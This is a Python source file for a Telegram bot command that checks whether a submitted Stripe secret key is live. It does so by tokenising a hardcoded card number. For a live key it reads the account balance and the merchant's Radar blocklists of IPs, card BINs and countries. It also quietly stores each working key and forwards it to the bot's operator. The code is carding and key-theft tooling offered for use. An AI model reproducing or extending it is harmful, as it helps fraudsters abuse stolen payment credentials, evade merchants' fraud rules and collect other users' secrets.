from pyrogram import Client, filters
from FUNC.usersdb_func import *
import asyncio, httpx
from FUNC.defs import *
from TOOLS.check_all_func import *

async def getskinfo(sk):
    import stripe

    stripe.api_key = sk
    all = stripe.radar.ValueList.list()
    useripdb = ""
    cardbindb = ""
    cardcountrydb = ""
    ipcountrydb = ""
    usersipresp = """Users IP Blacklisted: (0)
N/A"""
    cardbinresp = """Card Bin Blacklisted: (0)
N/A"""
    cardcountryresp = """Card Country Blacklisted: (0)
N/A"""
    ipcountryresp = """Country's IP Blacklisted: (0)
N/A"""
    for i in all:
        module = i["alias"]
        if module == "client_ip_address_blocklist":
            totalip = i["list_items"]["total_count"]
            if totalip != 0:
                alldata = i["list_items"]["data"]
                for data in alldata:
                    each = data["value"]
                    useripdb += each + "\n"
                usersipresp = f"""Users IP Blacklisted: ({totalip})
{useripdb}"""
            else:
                usersipresp = f"""Users IP Blacklisted: ({totalip})
N/A"""
        elif module == "card_bin_blocklist":
            totalbin = i["list_items"]["total_count"]
            if totalbin != 0:
                alldata = i["list_items"]["data"]
                for data in alldata:
                    each = data["value"]
                    cardbindb += each + "\n"
                cardbinresp = f"""Card Bin Blacklisted: ({totalbin})
{cardbindb}"""
            else:
                cardbinresp = f"""Card Bin Blacklisted: ({totalbin})
N/A"""
        elif module == "card_country_blocklist":
            totalcountry = i["list_items"]["total_count"]
            if totalcountry != 0:
                alldata = i["list_items"]["data"]
                for data in alldata:
                    each = data["value"]
                    cardcountrydb += each + "\n"
                cardcountryresp = f"""Card Country Blacklisted: ({totalcountry})
{cardcountrydb}"""
            else:
                cardcountryresp = f"""Card Country Blacklisted: ({totalcountry})
N/A"""

        elif module == "client_ip_country_blocklist":
            ipcountry = i["list_items"]["total_count"]
            if ipcountry != 0:
                alldata = i["list_items"]["data"]
                for data in alldata:
                    each = data["value"]
                    ipcountrydb += each + "\n"
                ipcountryresp = f"""Country's IP Blacklisted: ({ipcountry})
{ipcountrydb}"""
            else:
                ipcountryresp = f"""Country's IP Blacklisted: ({ipcountry})
N/A"""
        else:
            pass
    return usersipresp, cardbinresp, cardcountryresp, ipcountryresp


async def getbalance(sk):
    try:
        import stripe

        stripe.api_key = sk
        fetch = stripe.Balance.retrieve()
        get = fetch["available"][0]
        currency = fetch["available"][0]["currency"]
        balance = fetch["available"][0]["amount"]
        cards = fetch["available"][0]["source_types"]["card"]
    except:
        currency = "N/A"
        balance = "N/A"
        cards = "N/A"
    return currency, balance, cards


async def sk_checker_func(sk, session):
    try:
        url = "https://api.stripe.com/v1/tokens"
        data = {
            "card[number]": "5278540001668044",
            "card[exp_month]": "10",
            "card[exp_year]": "2029",
            "card[cvc]": "242",
        }
        headers = {
            "Authorization": f"Bearer {sk}",
        }
        result = await session.post(url, headers=headers, data=data)
        result = result.text
        return result
    except Exception as e:
        return str(e)


@Client.on_message(filters.command("sk", [".", "/"]))
async def sk_cmd(Client, message):
    try:
        try:
            sk = message.text.split(" ")[1]
        except:
            resp = """<b>Invalid SK ⚠️

Message: Not Found Any Valid SK From Your Input .</b>"""
            await message.reply_text(resp, message.id)
            return

        done = await message.reply_text("<b>Checking Your SK Wait....</b>", message.id)
        await asyncio.sleep(0.5)
        session = httpx.AsyncClient(timeout=10)
        result = await sk_checker_func(sk, session)

        if "tok_" in result or '"cvc_check": "unchecked"' in result:
            getskbalance = await getbalance(sk)
            currency, balance, cards = getskbalance[0], getskbalance[1], getskbalance[2]
            getinfo = await getskinfo(sk)
            usersipresp, cardbinresp, cardcountryresp, ipcountryresp = (
                getinfo[0],
                getinfo[1],
                getinfo[2],
                getinfo[3],
            )
            resp = f"""<b>
Stripe Key Checked Successfully ✅
━━━━━━━━━━━━━━ 
Key : <code>{sk}</code>
Response : SK LIVE 💚

Balance Info:
Currency: {currency}
Balance: {balance}$
Cards Processed: {cards}

More Info:
{usersipresp}
{cardbinresp}
{cardcountryresp}
{ipcountryresp}

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>
            </b>"""
            await addsk(sk)
            await sendsk(resp, session)

        elif "rate limit" in result or "rate_limit" in result:
            getskbalance = await getbalance(sk)
            currency, balance, cards = getskbalance[0], getskbalance[1], getskbalance[2]
            getinfo = await getskinfo(sk)
            usersipresp, cardbinresp, cardcountryresp, ipcountryresp = (
                getinfo[0],
                getinfo[1],
                getinfo[2],
                getinfo[3],
            )
            resp = f"""<b>
Stripe Key Checked Successfully ✅
━━━━━━━━━━━━━━ 
Key : <code>{sk}</code>
Response : RATE LIMIT ⚠️

Balance Info:
Currency: {currency}
Balance: {balance}$
Cards Processed: {cards}

More Info:
{usersipresp}
{cardbinresp}
{cardcountryresp}
{ipcountryresp}

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>
</b>"""
            await addsk(sk)
            await sendsk(resp, session)

        elif "Invalid API Key" in result:
            resp = f"""<b>
Stripe Key Checked Successfully ✅
━━━━━━━━━━━━━━ 
Key : <code>{sk}</code>
Response: INVALID KEY GIVEN ❌

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>
</b>"""
        elif "Expired API Key provided" in result:
            resp = f"""<b>
Stripe Key Checked Successfully ✅
━━━━━━━━━━━━━━ 
Key : <code>{sk}</code>
Response: EXPIRED KEY ❌

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>
</b>"""
        elif "Your account cannot currently make live charges." in result:
            resp = f"""<b>
Stripe Key Checked Successfully ✅
━━━━━━━━━━━━━━ 
Key : <code>{sk}</code>
Response: TESTMODE CHARGES ONLY ❌

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>
</b> """
        else:
            resp = f"""<b>
Stripe Key Checked Successfully ✅
━━━━━━━━━━━━━━ 
Key : <code>{sk}</code>
Response: {result} ❌

Checked By <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> 
Bot by - <a href="tg://user?id=5371579102">stripe_xD</a>
</b>"""
        await Client.edit_message_text(message.chat.id, done.id, resp)
        with open("sk_resp.txt", "a", encoding="utf-8") as f:
            f.write(sk + " " + result + "\n")

    except:
        import traceback
        await error_log(traceback.format_exc())
